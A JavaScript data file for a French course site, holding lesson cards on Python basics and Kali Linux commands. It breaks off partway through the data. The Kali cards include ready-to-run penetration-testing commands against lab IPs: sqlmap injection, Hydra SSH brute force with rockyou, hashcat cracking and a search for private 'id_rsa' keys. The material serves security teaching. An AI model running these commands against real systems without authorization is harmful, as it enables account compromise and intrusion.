/* Les fiches de cours sont déclarées ici pour faciliter l'ajout de notions. */
const makeItem = (nom, niveau, utilite, syntaxe, exemple, attention = "Adapte cet exemple à ton propre environnement et vérifie le résultat.") => ({ nom, niveau, utilite, syntaxe, exemple, attention });
const group = (categorie, items) => ({ categorie, items });

const data = {
  python: [
    group("Bases", [
      makeItem("print()", "Débutant", "Affiche une valeur, un message ou le résultat d'un calcul dans la console.", 'print("Bonjour !")\nprint(2 + 2)', "Affiche le texte Bonjour ! puis le chiffre 4 sur une nouvelle ligne."),
      makeItem("input()", "Débutant", "Demande une saisie au clavier à l'utilisateur et renvoie une chaîne de caractères.", 'nom = input("Ton nom : ")\nprint(f"Bienvenue {nom}")', "La saisie est stockée dans la variable nom puis affichée.", "Pour manipuler un nombre, convertis explicitement la saisie avec int() ou float()."),
      makeItem("Commentaires #", "Débutant", "Documente le code. Python ignore tout le texte situé après un # jusqu'à la fin de la ligne.", "# Calcule l'âge d'un utilisateur\nage = 2026 - 2004  # Année courante", "La première ligne et la fin de la seconde servent uniquement de notes pour le lecteur."),
      makeItem("Variables", "Débutant", "Associe un identifiant à une valeur en mémoire afin de la réutiliser ultérieurement.", 'prenom = "Lina"\nage = 18\nest_etudiant = True', "Les variables prenom, age et est_etudiant stockent des types différents."),
      makeItem("int", "Débutant", "Représente un nombre entier, positif ou négatif, sans limite théorique de taille en Python 3.", "quantite = 4\nreste = -12", "Les variables contiennent des nombres entiers signés."),
      makeItem("float", "Débutant", "Représente un nombre à virgule flottante (décimal) conforme au standard IEEE 754.", "temperature = 21.5\npi = 3.14159", "Le point sert de séparateur décimal."),
      makeItem("str", "Débutant", "Représente une chaîne de caractères immuable, délimitée par des guillemets simples ou doubles.", 'langage = "Python"\nversion = \'3.13\'', "Les variables stockent du texte encodé en UTF-8 par défaut."),
      makeItem("bool", "Débutant", "Représente une valeur logique booléenne : True (vrai) ou False (faux).", "est_connecte = True\na_les_droits = False", "Valeur fondamentale pour évaluer les conditions if/else.")
    ]),
    group("Opérateurs", [
      makeItem("+ - * /", "Débutant", "Effectue les quatre opérations arithmétiques de base.", "total = 8 + 2\ndifference = 10 - 3\nproduit = 4 * 2.5\ndivision = 15 / 3", "En Python 3, la division simple '/' renvoie toujours un float (5.0 ici)."),
      makeItem("// % **", "Débutant", "Calcule le quotient entier (//), le reste modulo (%) ou la puissance (**).", "quotient = 9 // 2   # 4\nreste = 9 % 2       # 1\npuissance = 2 ** 8  # 256", "9 divisé par 2 donne 4 avec un reste de 1 ; 2 élevé à la puissance 8 vaut 256."),
      makeItem("Comparaisons", "Débutant", "Compare deux valeurs avec ==, !=, <, >, <=, >= et renvoie un booléen.", "age = 20\nmajeur = (age >= 18)\nidentique = (10 == 10.0)", "majeur vaut True car 20 >= 18 ; identique vaut True car les valeurs sont égales."),
      makeItem("Logique and or not", "Débutant", "Combine ou inverse des conditions selon l'algèbre de Boole.", "est_admin = True\nactif = True\nautorise = est_admin and actif\nprint(not False)", "and requiert les deux opérandes vrais ; not inverse la valeur logique.")
    ]),
    group("Conditions", [
      makeItem("if", "Débutant", "Exécute un bloc de code uniquement si la condition spécifiée est vraie.", "temperature = 28\nif temperature > 25:\n    print(\"Climatisation activée\")", "Le message s'affiche car temperature dépasse 25.", "L'indentation de 4 espaces est obligatoire pour délimiter le bloc."),
      makeItem("elif", "Débutant", "Teste une condition alternative lorsque les conditions précédentes étaient fausses.", "note = 14\nif note >= 16:\n    mention = \"Très bien\"\nelif note >= 12:\n    mention = \"Bien\"\nelse:\n    mention = \"Passable\"", "Python évalue les branches dans l'ordre et s'arrête au premier test vrai."),
      makeItem("else", "Débutant", "Définit la branche par défaut exécutée si aucun if ou elif n'a été validé.", "connecte = False\nif connecte:\n    print(\"Tableau de bord\")\nelse:\n    print(\"Veuillez vous identifier\")", "Garantit qu'une action de repli est toujours exécutée.")
    ]),
    group("Boucles", [
      makeItem("for", "Débutant", "Itère sur chaque élément d'une séquence (liste, tuple, chaîne, dictionnaire).", 'serveurs = ["srv-web", "srv-db", "srv-dns"]\nfor nom in serveurs:\n    print(f"Contrôle de {nom}...")', "Exécute le bloc une fois pour chaque élément de la liste."),
      makeItem("while", "Débutant", "Répète un bloc d'instructions tant qu'une condition reste vraie.", "tentatives = 3\nwhile tentatives > 0:\n    print(f\"Essais restants : {tentatives}\")\n    tentatives -= 1", "Affiche le décompte puis s'arrête dès que tentatives vaut 0.", "Pense toujours à incrémenter ou modifier la condition pour éviter une boucle infinie."),
      makeItem("break", "Intermédiaire", "Interrompt immédiatement l'exécution de la boucle la plus proche.", "for port in range(1, 1024):\n    if port == 80:\n        print(\"Port HTTP trouvé !\")\n        break", "La boucle s'arrête dès que le port 80 est atteint."),
      makeItem("continue", "Intermédiaire", "Passe immédiatement au tour d'itération suivant en sautant le reste du bloc.", "for n in range(5):\n    if n == 2:\n        continue\n    print(n)", "Affiche 0, 1, 3, 4 : le tour où n == 2 a été sauté."),
      makeItem("range()", "Débutant", "Génère une séquence arithmétique d'entiers (début, fin_exclue, pas).", "for index in range(0, 10, 2):\n    print(index, end=' ')", "Affiche 0 2 4 6 8. La borne de fin n'est jamais incluse.")
    ]),
    group("Structures de données", [
      makeItem("Liste", "Débutant", "Collection ordonnée et mutable pouvant contenir des éléments hétérogènes.", 'ports = [22, 80, 443]\nports.append(8080)\nports.remove(80)\nprint(ports[0])', "append ajoute en fin de liste, remove supprime la première occurrence, [0] lit le premier élément."),
      makeItem("Tuple", "Débutant", "Collection ordonnée et immuable (non modifiable après création).", 'coordonnees = (48.8566, 2.3522)\nlatitude, longitude = coordonnees', "Protège les données contre les modifications involontaires et permet le déballage de tuple."),
      makeItem("Dictionnaire", "Intermédiaire", "Table de hachage associant des clés uniques à des valeurs.", 'services = {"ssh": 22, "http": 80, "https": 443}\nprint(services["ssh"])\nprint(services.get("ftp", 21))', "get() renvoie une valeur par défaut sans lever d'erreur si la clé n'existe pas.", "Les clés doivent être d'un type immuable (str, int, tuple)."),
      makeItem("Ensemble set", "Intermédiaire", "Collection non ordonnée d'éléments uniques, optimisée pour tester l'appartenance.", 'ips = {"192.168.1.1", "10.0.0.1", "192.168.1.1"}\nprint(len(ips))\nprint("10.0.0.1" in ips)', "Élimine automatiquement les doublons : len(ips) vaut 2.")
    ]),
    group("Fonctions", [
      makeItem("def", "Débutant", "Définit une fonction réutilisable avec des paramètres et un corps d'instructions.", "def calculer_tva(prix_ht, taux=0.20):\n    return prix_ht * (1 + taux)\n\nttc = calculer_tva(100)", "Appelle la fonction avec 100 et le taux par défaut de 20%, renvoyant 120.0."),
      makeItem("Paramètres", "Débutant", "Transmet des données positionnelles, nommées ou avec valeurs par défaut.", 'def journaliser(message, niveau="INFO"):\n    print(f"[{niveau}] {message}")\n\njournaliser("Démarrage", niveau="CRITIQUE")', "Permet d'adapter le comportement de la fonction selon les arguments fournis."),
      makeItem("return", "Débutant", "Met fin à l'exécution de la fonction et renvoie une valeur à l'appelant.", "def est_pair(nombre):\n    return nombre % 2 == 0\n\nresultat = est_pair(42)", "Renvoie le booléen True sans afficher directement dans la console."),
      makeItem("lambda", "Intermédiaire", "Fonction anonyme concise restreinte à une seule expression calculée.", 'utilisateurs = [{"nom": "Bob", "age": 25}, {"nom": "Alice", "age": 22}]\nutilisateurs.sort(key=lambda u: u["age"])', "Trie la liste d'utilisateurs par âge croissant grâce à la fonction lambda.")
    ]),
    group("Chaînes de texte", [
      makeItem("f-strings", "Débutant", "Chaîne de formatage moderne préfixée par 'f' évaluant le code entre accolades.", 'utilisateur = "admin"\nip = "10.0.0.5"\nprint(f"Connexion de {utilisateur} depuis {ip}")', "Plus lisible et performant que l'ancienne méthode .format() ou %s."),
      makeItem(".split()", "Débutant", "Découpe une chaîne selon un séparateur et produit une liste.", 'donnees = "root:x:0:0:root:/root:/bin/bash"\nchamps = donnees.split(":")', "champs contient les 7 segments séparés par deux-points."),
      makeItem(".join()", "Intermédiaire", "Concatène les éléments d'un itérable en insérant un séparateur.", 'mots = ["Python", "est", "puissant"]\nphrase = " ".join(mots)', "Produit 'Python est puissant' à partir de la liste."),
      makeItem(".replace()", "Débutant", "Renvoie une nouvelle chaîne en remplaçant un motif par un autre.", 'texte = "Erreur sur le port 8080"\ncorrige = texte.replace("8080", "443")', "Remplace 8080 par 443 sans modifier la chaîne d'origine qui reste immuable."),
      makeItem("Slicing", "Débutant", "Extrait une sous-chaîne selon la syntaxe [début:fin_exclue:pas].", 'langage = "Python"\nprint(langage[0:2])   # "Py"\nprint(langage[::-1])  # "nohtyP"', "[0:2] prend les 2 premières lettres ; [::-1] inverse la chaîne complète.")
    ]),
    group("Fichiers", [
      makeItem("open()", "Débutant", "Ouvre un fichier et retourne un objet fichier avec un mode ('r', 'w', 'a', 'b').", 'fichier = open("journal.log", "r", encoding="utf-8")\ncontenu = fichier.read()\nfichier.close()', "Lit l'intégralité du fichier. Privilégie la structure with pour la fermeture automatique.", "Spécifie toujours explicitement encoding='utf-8'."),
      makeItem("Lire un fichier", "Débutant", "Lit ligne par ligne ou l'intégralité du contenu avec le gestionnaire de contexte.", 'with open("cibles.txt", "r", encoding="utf-8") as f:\n    for ligne in f:\n        print(ligne.strip())', "strip() retire les retours à la ligne superflus."),
      makeItem("Écrire un fichier", "Débutant", "Écrit du texte dans un fichier en écrasement ('w') ou en ajout ('a').", 'with open("rapport.txt", "w", encoding="utf-8") as f:\n    f.write("Rapport de scan : 0 anomalie\\n")', "Crée le fichier ou l'écrase complètement s'il existait déjà."),
      makeItem("with", "Débutant", "Gestionnaire de contexte garantissant la libération propre des ressources.", 'with open("donnees.csv", "r", encoding="utf-8") as flux:\n    premiere_ligne = flux.readline()', "Ferme automatiquement le fichier, même en cas d'exception non gérée.")
    ]),
    group("Erreurs", [
      makeItem("try", "Débutant", "Encadre un bloc de code susceptible de lever une exception à l'exécution.", 'try:\n    reponse = 10 / 0\nexcept ZeroDivisionError:\n    print("Division par zéro interdite")', "Empêche le programme de planter brutalement lors d'une erreur."),
      makeItem("except", "Débutant", "Intercepte un type d'erreur spécifique pour le traiter proprement.", 'try:\n    valeur = int("abc")\nexcept ValueError as err:\n    print(f"Erreur de conversion : {err}")', "Capture uniquement l'exception ValueError ciblée."),
      makeItem("finally", "Intermédiaire", "Bloc dont l'exécution est garantie, qu'une erreur soit survenue ou non.", 'try:\n    connexion = "ouverte"\nfinally:\n    connexion = "fermee"\n    print("Nettoyage effectué")', "Idéal pour refermer des sockets réseau ou des descripteurs de fichiers."),
      makeItem("raise", "Intermédiaire", "Déclenche volontairement une exception lorsque les préconditions ne sont pas respectées.", 'def valider_port(port):\n    if not (1 <= port <= 65535):\n        raise ValueError(f"Port invalide : {port}")', "Permet d'interrompre l'exécution dès qu'un état anormal est détecté.")
    ]),
    group("Modules", [
      makeItem("import", "Débutant", "Charge un module de la bibliothèque standard ou d'un paquet tiers.", 'import math\nfrom pathlib import Path\nprint(math.sqrt(64))', "math.sqrt calcule la racine carrée de 64 (8.0)."),
      makeItem("os", "Intermédiaire", "Interagit avec les fonctions du système d'exploitation et l'environnement.", 'import os\nprint("Dossier courant :", os.getcwd())\nprint("Utilisateur :", os.getenv("USER", "inconnu"))', "Permet de lire les variables d'environnement et de manipuler le système."),
      makeItem("sys", "Intermédiaire", "Accède aux variables et paramètres internes de l'interpréteur Python.", 'import sys\nprint("Version Python :", sys.version_info.major)\nprint("Arguments CLI :", sys.argv)', "sys.argv liste les arguments passés lors du lancement du script."),
      makeItem("math", "Débutant", "Fournit les fonctions mathématiques standard (trigo, logarithmes, constantes).", 'import math\nprint(math.pi)\nprint(math.ceil(4.2))   # 5\nprint(math.floor(4.8))  # 4', "Fonctions optimisées écrites en C sous le capot."),
      makeItem("random", "Débutant", "Génère des nombres pseudo-aléatoires et effectue des tirages au sort.", 'import random\nvaleur = random.randint(1, 100)\nchoix = random.choice(["rouge", "vert", "bleu"])', "random.randint(1, 100) inclut 1 et 100.", "Pour la cryptographie, préfère le module standard 'secrets'."),
      makeItem("datetime", "Intermédiaire", "Manipule les dates, les heures et les calculs d'intervalles temporels.", 'from datetime import datetime, timedelta\nmaintenant = datetime.now()\ndemain = maintenant + timedelta(days=1)\nprint(maintenant.strftime("%Y-%m-%d %H:%M:%S"))', "strftime formate la date selon la norme souhaitée.")
    ]),
    group("POO", [
      makeItem("Classe", "Intermédiaire", "Modèle définissant les attributs et méthodes partagés par ses instances.", 'class Serveur:\n    def __init__(self, ip, port=80):\n        self.ip = ip\n        self.port = port\n\n    def url(self):\n        return f"http://{self.ip}:{self.port}"', "Définit la structure d'un objet Serveur avec son constructeur et ses méthodes."),
      makeItem("Objet", "Intermédiaire", "Instance concrète créée à partir d'une classe.", 'srv = Serveur("192.168.1.50", 8080)\nprint(srv.url())', "srv est une instance spécifique de la classe Serveur."),
      makeItem("__init__", "Intermédiaire", "Méthode spéciale (constructeur) appelée automatiquement à l'instanciation.", 'class Utilisateur:\n    def __init__(self, pseudo, role="visiteur"):\n        self.pseudo = pseudo\n        self.role = role', "Initialise les attributs de l'instance avec les valeurs fournies."),
      makeItem("Héritage", "Intermédiaire", "Mécanisme permettant à une classe d'hériter des propriétés d'une classe parente.", 'class ServeurSecurise(Serveur):\n    def url(self):\n        return f"https://{self.ip}:443"', "ServeurSecurise surcharge la méthode url tout en conservant le constructeur parent.")
    ]),
    group("Outils", [
      makeItem("pip", "Débutant", "Gestionnaire officiel de paquets tiers pour Python (PyPI).", 'python -m pip install requests rich\npython -m pip list', "Télécharge et installe des bibliothèques dans l'environnement Python actif."),
      makeItem("Environnement virtuel venv", "Débutant", "Isole les dépendances de chaque projet pour éviter les conflits de versions.", '# Création :\npython -m venv .venv\n# Activation Linux/macOS :\nsource .venv/bin/activate\n# Activation Windows :\n.venv\\Scripts\\activate', "Une fois activé, 'pip install' n'installe que dans ce dossier isolé."),
      makeItem("requests", "Intermédiaire", "Bibliothèque HTTP intuitive pour consommer des APIs web et envoyer des requêtes.", 'import requests\nreponse = requests.get("https://api.github.com", timeout=5)\nprint(reponse.status_code)\ndata = reponse.json()', "Effectue une requête GET HTTPS et désérialise la réponse JSON reçue.")
    ]),
    group("Python pour la sécurité", [
      makeItem("socket", "Intermédiaire", "Interface de programmation pour la communication réseau TCP/UDP bas niveau.", 'import socket\nhote = socket.gethostbyname("localhost")\nprint(f"IP locale résolue : {hote}")', "Permet d'ouvrir des connexions réseau brutes et d'écouter sur des ports."),
      makeItem("subprocess", "Intermédiaire", "Exécute des commandes système et capture leurs flux standard en toute sécurité.", 'import subprocess\nres = subprocess.run(["ping", "-c", "1", "127.0.0.1"], capture_output=True, text=True)\nprint(res.stdout)', "capture_output=True capture la sortie pour analyse dans le script.", "Évite shell=True avec des entrées utilisateur pour prévenir les injections de commandes."),
      makeItem("Scan de ports en labo", "Intermédiaire", "Teste l'ouverture d'un port TCP avec gestion d'un délai d'attente.", 'import socket\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.settimeout(0.5)\n    ouvert = (s.connect_ex(("127.0.0.1", 80)) == 0)\n    print("Port 80 ouvert" if ouvert else "Port 80 fermé")', "connect_ex renvoie 0 si la connexion TCP réussit (port ouvert)."),
      makeItem("hashlib", "Intermédiaire", "Calcule des empreintes cryptographiques sécurisées (SHA-256, SHA-512, MD5).", 'import hashlib\ntexte = "mot_de_passe_secret".encode("utf-8")\nempreinte = hashlib.sha256(texte).hexdigest()\nprint(empreinte)', "Calcule l'empreinte hexadécimale SHA-256 de 64 caractères.")
    ]),
    group("Mini-projets", [
      makeItem("Calculatrice", "Débutant", "Script complet évaluant des opérations arithmétiques sécurisées.", 'def calculer(a, b, op):\n    operations = {"+": a + b, "-": a - b, "*": a * b, "/": a / b if b != 0 else "Erreur"}\n    return operations.get(op, "Opération inconnue")\n\nprint(calculer(10, 2, "/"))', "Gère les 4 opérations et protège contre la division par zéro."),
      makeItem("Devine le nombre", "Débutant", "Jeu interactif comparant un choix aléatoire à des propositions de l'utilisateur.", 'import random\nsecret = random.randint(1, 100)\ntentative = 50\nprint("Gagné !" if tentative == secret else ("Trop haut" if tentative > secret else "Trop bas"))', "Utilise des conditions et le module random pour guider l'utilisateur."),
      makeItem("Générateur de mot de passe", "Intermédiaire", "Génère un mot de passe robuste et cryptographiquement sûr.", 'import secrets, string\nalphabet = string.ascii_letters + string.digits + "!@#$%^&*"\nmdp = "".join(secrets.choice(alphabet) for _ in range(16))\nprint("Mot de passe sécurisé :", mdp)', "secrets.choice utilise le générateur sécurisé du système d'exploitation."),
      makeItem("To-do list", "Débutant", "Gestionnaire de tâches console avec ajout, consultation et suppression.", 'taches = []\ntaches.append("Apprendre Python")\ntaches.append("Tester Nmap")\ntaches.remove("Apprendre Python")\nprint("Tâches restantes :", taches)', "Met en pratique les méthodes d'altération de liste (append, remove).")
    ])
  ],

  kali: [
    group("Introduction", [
      makeItem("Kali Linux", "Débutant", "Distribution Linux basée sur Debian, conçue pour les tests de pénétration et l'audit de sécurité.", 'lsb_release -a', "Affiche la version exacte et le nom de code de la distribution Kali Linux installée."),
      makeItem("Installation en machine virtuelle", "Débutant", "Procédure d'installation recommandée dans VirtualBox ou VMware pour un confinement total.", 'sudo apt update && sudo apt install -y virtualbox-guest-x11', "Installe les pilotes d'affichage et d'intégration pour machine virtuelle VirtualBox."),
      makeItem("Dual boot", "Intermédiaire", "Coexistence de Kali avec un autre système au démarrage de la machine.", 'sudo update-grub', "Régénère le menu du chargeur d'amorçage GRUB pour détecter les systèmes installés.", "Attention lors du partitionnement de disque pour ne pas écraser votre système principal."),
      makeItem("apt update", "Débutant", "Synchronise l'index local des paquets avec les serveurs des dépôts officiels Kali.", 'sudo apt update', "Télécharge la liste des dernières versions logicielles disponibles sans rien installer."),
      makeItem("Mise à jour Kali", "Débutant", "Met à niveau l'ensemble des paquets et du noyau vers les versions les plus récentes.", 'sudo apt update && sudo apt dist-upgrade -y', "Commande officielle pour maintenir une installation Kali Rolling à jour.")
    ]),
    group("Commandes Linux de base", [
      makeItem("ls", "Débutant", "Liste les fichiers et dossiers avec options d'affichage détaillé et masqué.", 'ls -la', "-l affiche les permissions, taille et dates ; -a révèle les fichiers cachés (commençant par .)."),
      makeItem("cd", "Débutant", "Change le répertoire courant de travail dans l'arborescence.", 'cd ~/Documents\ncd ..', "Bascule dans le sous-dossier Documents, puis remonte au dossier parent avec '..'."),
      makeItem("pwd", "Débutant", "Affiche le chemin absolu du répertoire dans lequel vous vous trouvez (Print Working Directory).", 'pwd', "Affiche par exemple /home/kali/Desktop."),
      makeItem("mkdir", "Débutant", "Crée un ou plusieurs nouveaux répertoires dans l'arborescence.", 'mkdir -p projets/lab1/rapports', "-p crée automatiquement les répertoires parents manquants."),
      makeItem("rm", "Débutant", "Supprime définitivement des fichiers ou répertoires (sans corbeille).", 'rm -i ancien.txt\nrm -rf dossier_temporaire/', "-i demande confirmation avant suppression ; -rf supprime récursivement un dossier sans avertissement.", "À manipuler avec une extrême vigilance, la suppression sous Linux étant irréversible."),
      makeItem("cp", "Débutant", "Copie des fichiers ou des dossiers entiers vers une nouvelle destination.", 'cp notes.txt backup_notes.txt\ncp -r lab/ lab_sauvegarde/', "-r permet la copie récursive de dossiers complets."),
      makeItem("mv", "Débutant", "Déplace un fichier ou le renomme sur place.", 'mv brouillon.txt final.txt\nmv final.txt ~/Rapports/', "Renomme brouillon.txt en final.txt puis le déplace dans le dossier Rapports."),
      makeItem("cat", "Débutant", "Affiche le contenu d'un fichier texte dans la sortie standard du terminal.", 'cat -n /etc/hosts', "-n numérote chaque ligne du fichier affiché."),
      makeItem("nano", "Débutant", "Éditeur de texte simple et interactif directement dans le terminal.", 'nano script.sh', "Ouvre l'éditeur ; Ctrl+O enregistre et Ctrl+X quitte."),
      makeItem("touch", "Débutant", "Crée un fichier vide ou met à jour sa date de dernier accès.", 'touch script.py config.json', "Crée les deux fichiers s'ils n'existent pas encore."),
      makeItem("man", "Débutant", "Ouvre la page de manuel officielle complète d'une commande système.", 'man nmap', "Affiche toutes les options, explications et exemples officiels. Appuie sur 'q' pour quitter."),
      makeItem("clear", "Débutant", "Efface l'affichage visible de la fenêtre du terminal.", 'clear', "Nettoie l'écran (raccourci clavier équivalent : Ctrl + L).")
    ]),
    group("Permissions & utilisateurs", [
      makeItem("chmod", "Intermédiaire", "Modifie les droits d'accès en lecture (r), écriture (w) et exécution (x).", 'chmod +x script.sh\nchmod 755 script.sh', "+x rend le script exécutable ; 755 attribue rwx au propriétaire et rx aux autres."),
      makeItem("chown", "Intermédiaire", "Modifie le propriétaire et le groupe assignés à un fichier ou dossier.", 'sudo chown -R kali:kali /var/www/html', "-R applique le changement de propriétaire de façon récursive à tout le dossier."),
      makeItem("sudo", "Débutant", "Exécute une commande avec les privilèges de sécurité du super-administrateur (root).", 'sudo systemctl restart apache2', "Demande le mot de passe utilisateur pour autoriser l'action d'administration."),
      makeItem("su", "Intermédiaire", "Bascule vers une session sous l'identité d'un autre compte utilisateur.", 'su - kali', "Ouvre un shell complet avec l'environnement et les variables du compte spécifié."),
      makeItem("whoami", "Débutant", "Affiche le nom d'utilisateur associé à la session de terminal actuelle.", 'whoami && id', "Affiche le pseudonyme suivi de l'UID, GID et des groupes d'appartenance."),
      makeItem("adduser", "Intermédiaire", "Crée un nouveau compte utilisateur de manière interactive avec dossier personnel.", 'sudo adduser auditeur', "Guide pas à pas pour définir le mot de passe et les informations du nouvel utilisateur.")
    ]),
    group("Gestion des paquets", [
      makeItem("apt update", "Débutant", "Actualise les métadonnées locales des dépôts logiciels configurés.", 'sudo apt update', "Vérifie les mises à jour sans modifier les logiciels déjà installés."),
      makeItem("apt upgrade", "Débutant", "Télécharge et installe les nouvelles versions de tous les paquets présents.", 'sudo apt upgrade -y', "-y valide automatiquement l'installation des mises à niveau."),
      makeItem("apt install", "Débutant", "Télécharge et installe un logiciel et toutes ses dépendances requises.", 'sudo apt install -y htop curl git', "Installe les trois utilitaires demandés depuis les dépôts officiels."),
      makeItem("dpkg", "Intermédiaire", "Gestionnaire bas niveau de paquets Debian (.deb) locaux.", 'sudo dpkg -i package.deb\ndpkg -l | grep nmap', "-i installe un fichier .deb téléchargé manuellement ; -l liste les paquets installés.")
    ]),
    group("Réseau", [
      makeItem("ip a", "Débutant", "Affiche la liste détaillée de toutes les interfaces réseau et leurs adresses IP.", 'ip -c a', "Affiche les adresses IPv4/IPv6 avec coloration syntaxique (-c)."),
      makeItem("ifconfig", "Débutant", "Outil classique d'affichage et de configuration des interfaces réseau.", 'ifconfig eth0', "Affiche l'adresse IP, le masque de sous-réseau et les statistiques de transmission de l'interface eth0."),
      makeItem("ping", "Débutant", "Envoie des paquets ICMP Echo pour vérifier l'accessibilité réseau d'une machine.", 'ping -c 4 192.168.1.1', "-c 4 limite l'envoi à exactement 4 paquets avant d'afficher les statistiques de latence."),
      makeItem("netstat", "Intermédiaire", "Affiche les connexions réseau actives, les tables de routage et les ports en écoute.", 'netstat -tuln', "-t (TCP), -u (UDP), -l (écoute), -n (adresses numériques sans résolution DNS)."),
      makeItem("ss", "Intermédiaire", "Remplaçant moderne et beaucoup plus rapide de netstat pour inspecter les sockets.", 'ss -tulnp', "-p affiche le nom et le PID du processus responsable de chaque port ouvert."),
      makeItem("traceroute", "Intermédiaire", "Trace la route réseau et mesure les délais de transit des paquets vers une cible.", 'traceroute -n 8.8.8.8', "Liste chaque routeur intermédiaire jusqu'à la destination finale."),
      makeItem("nslookup", "Débutant", "Interroge les serveurs DNS pour obtenir les enregistrements associés à un domaine.", 'nslookup -type=mx example.com', "Recherche spécifiquement les serveurs de messagerie (MX) du domaine."),
      makeItem("dig", "Intermédiaire", "Outil d'interrogation DNS avancé fournissant des réponses techniques détaillées.", 'dig +short example.com A', "+short affiche directement l'adresse IP associée à l'enregistrement A sans en-têtes.")
    ]),
    group("Recherche & texte", [
      makeItem("grep", "Débutant", "Filtre les lignes correspondant à une expression régulière dans des fichiers.", 'grep -rn "admin" /etc/', "-r recherche récursivement dans les sous-dossiers et -n indique le numéro de ligne."),
      makeItem("find", "Intermédiaire", "Recherche des fichiers et dossiers selon des critères de taille, nom ou droits.", 'find /var/log -type f -name "*.log"', "Trouve tous les fichiers se terminant par .log dans le dossier /var/log."),
      makeItem("locate", "Débutant", "Trouve instantanément l'emplacement d'un fichier grâce à une base de données indexée.", 'sudo updatedb && locate id_rsa', "updatedb rafraîchit l'index puis locate trouve toutes les clés privées potentielles."),
      makeItem("awk", "Avancé", "Langage de traitement et d'extraction de données textuelles structurées en colonnes.", "awk -F':' '{print $1, $7}' /etc/passwd", "-F':' découpe chaque ligne par deux-points et affiche le nom du compte ($1) et son shell ($7)."),
      makeItem("sed", "Avancé", "Éditeur de flux permettant de modifier ou substituer du texte à la volée.", 'sed -i "s/DEBUG = True/DEBUG = False/g" config.py', "-i modifie le fichier sur place en remplaçant la chaîne ciblée."),
      makeItem("head", "Débutant", "Affiche les premières lignes d'un fichier texte (10 par défaut).", 'head -n 5 /etc/passwd', "-n 5 limite l'affichage aux cinq premières lignes."),
      makeItem("tail", "Débutant", "Affiche la fin d'un fichier texte ou surveille ses ajouts en temps réel.", 'tail -f /var/log/auth.log', "-f (follow) affiche les nouvelles lignes au fur et à mesure de leur écriture (ex: connexions SSH)."),
      makeItem("Pipes |", "Débutant", "Redirige le flux de sortie standard d'une commande vers l'entrée d'une autre.", 'cat /etc/passwd | grep "/bin/bash" | cut -d: -f1', "Enchaîne les trois commandes pour lister uniquement les utilisateurs ayant un shell interactif.")
    ]),
    group("Reconnaissance", [
      makeItem("nmap", "Intermédiaire", "Scanner de réseau de référence pour découvrir des hôtes, ports ouverts et versions de services.", 'nmap -sV -sC -T4 192.168.1.1', "-sV détecte les versions des services ; -sC exécute les scripts de vulnérabilités par défaut ; -T4 accélère le scan.", "À exécuter uniquement sur votre propre réseau ou avec une autorisation d'audit écrite."),
      makeItem("whois", "Débutant", "Consulte les bases publiques d'enregistrement de noms de domaine et blocs IP.", 'whois example.com', "Affiche le registrar, les contacts techniques, les serveurs DNS et les dates de validité."),
      makeItem("theHarvester", "Intermédiaire", "Outil OSINT collectant des e-mails, sous-domaines, noms et IPs via des sources ouvertes.", 'theHarvester -d example.com -b duckduckgo -l 200', "Recherche passivement les informations associées au domaine sans envoyer de paquet direct à la cible."),
      makeItem("Maltego", "Intermédiaire", "Plateforme graphique d'investigation de liens et d'analyse relationnelle OSINT.", 'maltego &', "Lance l'interface graphique de cartographie de données et de corrélations relationnelles.")
    ]),
    group("Analyse de vulnérabilités", [
      makeItem("nikto", "Intermédiaire", "Scanner de vulnérabilités web détectant les fichiers dangereux et configurations à risque.", 'nikto -h http://192.168.1.50:80 -C all', "-h spécifie l'hôte cible et -C all teste l'ensemble des vérifications disponibles.", "Génère un volume important de logs : facilement détectable par un pare-feu ou un WAF."),
      makeItem("OpenVAS", "Avancé", "Système complet d'audit de vulnérabilités réseau d'entreprise.", 'sudo gvm-start', "Démarre les démons Greenbone Vulnerability Management pour accéder à l'interface web locale."),
      makeItem("searchsploit", "Intermédiaire", "Utilitaire en ligne de commande interrogeant hors-ligne la base de données d'exploits Exploit-DB.", 'searchsploit "Apache 2.4.49"', "Recherche instantanément les PoC (Proof of Concept) d'exploits publiés pour la version ciblée.")
    ]),
    group("Attaques web (labo)", [
      makeItem("Burp Suite", "Intermédiaire", "Proxy HTTP/HTTPS d'interception et boîte à outils complète d'audit applicatif web.", 'burpsuite &', "Démarre l'outil pour intercepter, rejouer (Repeater) et modifier les requêtes HTTP entre navigateur et serveur."),
      makeItem("sqlmap", "Intermédiaire", "Outil automatisé de détection et d'exploitation de vulnérabilités SQL Injection.", "sqlmap -u 'http://192.168.1.50/vuln.php?id=1' --dbs --batch", "--dbs énumère les bases de données existantes et --batch choisit les réponses par défaut."),
      makeItem("dirb", "Intermédiaire", "Scanner d'arborescence web découvrant les répertoires et fichiers cachés par dictionnaire.", 'dirb http://192.168.1.50 /usr/share/wordlists/dirb/common.txt', "Teste systématiquement chaque chemin présent dans la wordlist."),
      makeItem("gobuster", "Intermédiaire", "Outil performant écrit en Go pour forcer des répertoires, sous-domaines ou virtual hosts.", 'gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt', "-x ajoute des extensions précises à tester sur chaque entrée."),
      makeItem("OWASP ZAP", "Intermédiaire", "Scanner de sécurité web open source maintenu par l'OWASP, alternative libre à Burp.", 'zaproxy &', "Permet de réaliser des scans passifs et actifs automatisés sur une application web.")
    ]),
    group("Mots de passe", [
      makeItem("hashcat", "Avancé", "Casseur de hash ultra-rapide tirant parti de la puissance de calcul parallèle des cartes graphiques (GPU).", 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt', "-m 0 cible le format MD5 brut et -a 0 sélectionne une attaque par dictionnaire."),
      makeItem("John the Ripper", "Intermédiaire", "Outil d'audit de robustesse et de cassage de mots de passe hors-ligne éprouvé.", 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', "Applique des règles de permutation pour identifier les mots de passe trop prévisibles."),
      makeItem("Hydra", "Intermédiaire", "Outil d'attaque par force brute en ligne testant des protocoles réseau (SSH, FTP, HTTP, etc.).", 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh -t 4', "-l définit l'utilisateur, -P la liste de mots de passe et -t 4 limite à 4 connexions simultanées.", "À utiliser exclusivement sur des cibles autorisées ; risque de verrouiller les comptes."),
      makeItem("Crunch", "Intermédiaire", "Générateur de dictionnaires de chaînes de caractères sur mesure selon un jeu de critères.", 'crunch 8 8 0123456789 -o pin_8_chiffres.txt', "Génère toutes les combinaisons possibles de 8 chiffres dans le fichier spécifié.")
    ]),
